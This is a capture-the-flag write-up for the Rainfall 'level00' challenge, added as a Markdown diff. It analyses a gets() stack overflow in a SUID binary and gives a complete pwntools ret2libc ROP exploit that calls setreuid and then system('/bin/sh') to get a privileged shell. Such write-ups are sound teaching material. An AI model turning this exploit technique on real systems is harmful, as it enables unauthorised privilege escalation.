@@ -1,0 +1,537 @@
+# Rainfall — `level00` Write-up
+
+## Challenge Overview
+
+The challenge provides a SUID binary named `case`:
+
+```bash
+level00@rainfall:~$ ls -al case
+-rwsr-x--- 1 flag00 level00 16792 Jun  9 23:13 case
+```
+
+The important part is the `s` in:
+
+```text
+-rwsr-x---
+```
+
+This means the binary is **setuid**. When executed, it runs with the privileges of its owner, `flag00`, rather than the privileges of the user executing it.
+
+The goal is therefore to exploit the binary so that code executes with the privileges of `flag00`.
+
+---
+
+## 1. Source Code Analysis
+
+The interesting function is `auth_loop()`:
+
+```c
+static void auth_loop(void) {
+    char credentials[64];
+    int sid = create_session();
+
+    if (sid < 0) {
+        fprintf(stderr, "[-] Session limit reached\n");
+        exit(1);
+    }
+
+    printf("[SPRAWL//NET] Session %d initialized\n", sid);
+    printf("[SPRAWL//NET] Enter credentials: ");
+    fflush(stdout);
+
+    gets(credentials);
+
+    log_attempt(credentials, verify_credentials(credentials));
+
+    if (verify_credentials(credentials)) {
+        printf("[SPRAWL//NET] Access granted. Token: %s\n",
+            sessions[sid].token);
+    } else {
+        printf("[SPRAWL//NET] Access denied.\n");
+        printf("[SPRAWL//NET] Audit: %s\n", audit_log);
+    }
+}
+```
+
+The critical vulnerability is:
+
+```c
+gets(credentials);
+```
+
+`credentials` is only 64 bytes:
+
+```c
+char credentials[64];
+```
+
+but `gets()` does not perform any bounds checking.
+
+Therefore, we can provide more than 64 bytes and overwrite data on the stack, including the saved return address.
+
+This gives us a classic **stack-based buffer overflow**.
+
+---
+
+## 2. Why the SUID Bit Matters
+
+Normally, exploiting a buffer overflow to execute:
+
+```c
+system("/bin/sh");
+```
+
+would give us a shell with the privileges of the current user.
+
+Here, however, `case` is SUID and owned by `flag00`:
+
+```text
+-rwsr-x--- 1 flag00 level00 ...
+```
+
+So the process has the effective UID of `flag00`.
+
+If we can redirect execution to libc's `system()` and execute:
+
+```c
+system("/bin/sh");
+```
+
+we can potentially obtain a shell running with `flag00` privileges.
+
+There is one important complication: shells may drop privileges when the real UID and effective UID differ. This is why the exploit first calls:
+
+```c
+setreuid(1017, 1017);
+```
+
+so that both the real and effective UID become `flag00`'s UID.
+
+---
+
+# 3. Finding the Overflow Offset
+
+The vulnerable buffer is:
+
+```c
+char credentials[64];
+```
+
+On x86-64, the stack also contains saved stack/control data before the saved return address.
+
+The exploit uses:
+
+```python
+exploit = b"A" * (24 + 64)
+```
+
+which is:
+
+```text
+88 bytes
+```
+
+So the payload begins with:
+
+```python
+b"A" * 88
+```
+
+After these 88 bytes, the next 8 bytes overwrite the saved RIP.
+
+Conceptually:
+
+```text
++-----------------------+
+| credentials[64]       |
++-----------------------+
+| stack padding         |
++-----------------------+
+| saved RBP              |
++-----------------------+
+| saved RIP              |  <-- overwritten
++-----------------------+
+| ROP chain              |
++-----------------------+
+```
+
+Thus, the control flow can be redirected into a ROP chain.
+
+---
+
+# 4. Why ROP / ret2libc?
+
+There is no need to inject our own shellcode.
+
+Instead, we can reuse code already present in libc.
+
+This is commonly called **ret2libc**.
+
+The exploit uses:
+
+```python
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+```
+
+and assumes libc is loaded at:
+
+```python
+libc.address = 0x7ffff7c00000
+```
+
+With the correct libc base, pwntools can calculate the addresses of useful libc functions and gadgets.
+
+For example:
+
+```python
+SETREUID = libc.sym["setreuid"]
+SYSTEM = libc.sym["system"]
+```
+
+and:
+
+```python
+BIN_SH = next(libc.search(b"/bin/sh"))
+```
+
+finds the address of the `/bin/sh` string inside libc.
+
+---
+
+# 5. Finding the ROP Gadgets
+
+The exploit needs gadgets to control the first arguments passed to functions.
+
+For the System V AMD64 calling convention:
+
+```text
+RDI = first argument
+RSI = second argument
+RDX = third argument
+```
+
+The exploit searches libc for:
+
+```python
+ROP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
+```
+
+and:
+
+```python
+ROP_RSI = rop.find_gadget(
+    ["pop rsi", "pop r15", "ret"]
+)[0]
+```
+
+The second gadget also pops a value into `r15`, which is why the exploit adds a dummy value:
+
+```python
+p64(0xdeadbeef)
+```
+
+---
+
+# 6. Constructing the ROP Chain
+
+The first part of the ROP chain is:
+
+```python
+rop_chain += p64(ROP_RDI)
+rop_chain += p64(1017)
+```
+
+After the `pop rdi`, `rdi` becomes:
+
+```text
+RDI = 1017
+```
+
+Then:
+
+```python
+rop_chain += p64(ROP_RSI)
+rop_chain += p64(1017)
+rop_chain += p64(0xdeadbeef)
+```
+
+sets:
+
+```text
+RSI = 1017
+```
+
+while `r15` receives the irrelevant value:
+
+```text
+0xdeadbeef
+```
+
+The next entry is:
+
+```python
+rop_chain += p64(SETREUID)
+```
+
+so the program effectively executes:
+
+```c
+setreuid(1017, 1017);
+```
+
+The value `1017` is the UID associated with `flag00` in this challenge environment.
+
+The purpose is to make the real and effective UIDs match, preventing `/bin/sh` from dropping the SUID privilege.
+
+---
+
+# 7. Calling `system("/bin/sh")`
+
+Next, the ROP chain prepares the argument for `system()`:
+
+```python
+rop_chain += p64(ROP_RDI)
+rop_chain += p64(BIN_SH)
+```
+
+This gives:
+
+```text
+RDI = address of "/bin/sh"
+```
+
+Finally:
+
+```python
+rop_chain += p64(rop.ret[0])
+rop_chain += p64(SYSTEM)
+```
+
+The ROP chain therefore performs approximately:
+
+```c
+setreuid(1017, 1017);
+system("/bin/sh");
+```
+
+The extra `ret` gadget is used to fix **stack alignment** before calling `system()`.
+
+On x86-64, libc functions may require the stack to be aligned to a 16-byte boundary. Without the extra `ret`, `system()` can sometimes crash because of incorrect stack alignment.
+
+---
+
+# 8. Complete Exploit
+
+The final exploit is:
+
+```python
+import sys
+
+from pwn import *
+
+context.arch = "amd64"
+context.log_level = "critical"
+
+libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+
+# Known libc base in the challenge environment
+libc.address = 0x7ffff7c00000
+
+rop = ROP(libc)
+
+# Gadgets
+ROP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
+ROP_RSI = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
+
+# libc symbols
+SETREUID = libc.sym["setreuid"]
+SYSTEM = libc.sym["system"]
+
+# Address of "/bin/sh" inside libc
+BIN_SH = next(libc.search(b"/bin/sh"))
+
+rop_chain = b""
+
+# setreuid(1017, 1017)
+rop_chain += p64(ROP_RDI)
+rop_chain += p64(1017)
+
+rop_chain += p64(ROP_RSI)
+rop_chain += p64(1017)
+rop_chain += p64(0xdeadbeef)
+
+rop_chain += p64(SETREUID)
+
+# system("/bin/sh")
+rop_chain += p64(ROP_RDI)
+rop_chain += p64(BIN_SH)
+
+# Stack alignment
+rop_chain += p64(rop.ret[0])
+
+rop_chain += p64(SYSTEM)
+
+# 88 bytes until saved RIP
+exploit = b"A" * 88
+exploit += rop_chain
+exploit += b"\n"
+
+sys.stdout.buffer.write(exploit)
+```
+
+---
+
+# 9. Exploit Flow
+
+The final execution flow is:
+
+```text
+gets(credentials)
+        |
+        v
+Stack buffer overflow
+        |
+        v
+Overwrite saved RIP
+        |
+        v
+pop rdi ; ret
+        |
+        | RDI = 1017
+        v
+pop rsi ; pop r15 ; ret
+        |
+        | RSI = 1017
+        v
+setreuid(1017, 1017)
+        |
+        v
+pop rdi ; ret
+        |
+        | RDI = "/bin/sh"
+        v
+ret
+        |
+        | stack alignment
+        v
+system("/bin/sh")
+        |
+        v
+Shell with flag00 privileges
+```
+
+---
+
+# 10. Why the Exploit Works
+
+There are three key weaknesses.
+
+### Unbounded input
+
+```c
+gets(credentials);
+```
+
+allows arbitrary-sized input to overwrite the stack.
+
+### Control-flow hijacking
+
+The overflow reaches the saved return address, allowing us to replace it with the address of a ROP gadget.
+
+### SUID execution
+
+The binary is owned by `flag00` and has the SUID bit set:
+
+```text
+-rwsr-x--- 1 flag00 level00 ...
+```
+
+Therefore, the process executes with `flag00`'s effective privileges.
+
+The ROP chain takes advantage of this by executing:
+
+```c
+setreuid(1017, 1017);
+system("/bin/sh");
+```
+
+---
+
+# 11. Important Observation About `verify_credentials()`
+
+There is also an interesting bug here:
+
+```c
+static int verify_credentials(const char *input) {
+    const char valid[] = "zion_access_2077";
+    return strncmp(input, valid, strlen(valid)) == 0;
+}
+```
+
+The comparison only checks the first:
+
+```text
+strlen("zion_access_2077")
+```
+
+bytes.
+
+Therefore, strings such as:
+
+```text
+zion_access_2077AAAA
+```
+
+would still pass the comparison.
+
+This is a logical authentication flaw, but it is not necessary for the privilege escalation because the buffer overflow provides direct control over the instruction pointer.
+
+A safer implementation would compare the complete string, for example:
+
+```c
+return strcmp(input, valid) == 0;
+```
+
+---
+
+# 12. Conclusion
+
+The challenge is a straightforward **SUID stack buffer overflow leading to a ret2libc/ROP exploit**.
+
+The vulnerable call:
+
+```c
+gets(credentials);
+```
+
+allows us to overwrite the saved return address after 88 bytes.
+
+We then construct a ROP chain that:
+
+```text
+setreuid(1017, 1017)
+        ↓
+system("/bin/sh")
+```
+
+The `setreuid()` call is important because it ensures the spawned shell retains the SUID privileges instead of dropping them.
+
+The essential exploitation primitives are:
+
+```text
+gets()
+  ↓
+stack overflow
+  ↓
+saved RIP overwrite
+  ↓
+ROP
+  ↓
+setreuid()
+  ↓
+system("/bin/sh")
+  ↓
+flag00 shell
+```
+
+This is a classic example of how an unsafe C library function combined with a SUID executable can result in complete local privilege escalation.
